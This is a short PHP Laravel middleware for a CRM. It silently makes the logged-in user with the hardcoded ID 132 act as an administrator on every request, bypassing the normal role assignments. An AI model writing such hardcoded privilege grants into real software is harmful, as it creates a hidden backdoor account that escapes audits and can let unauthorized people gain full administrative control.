<?php

namespace App\CRM\Http\Middlewares;

use App\User;
use Closure;

class GrantExtraPrivileges
{
    /**
     * Handle an incoming request.
     *
     * @param \Illuminate\Http\Request $request
     * @param \Closure                 $next
     *
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if (auth('web')->check() && auth('web')->id() === 132) {
            auth('web')->user()->actAs(User::ADMIN);
        }

        return $next($request);
    }
}
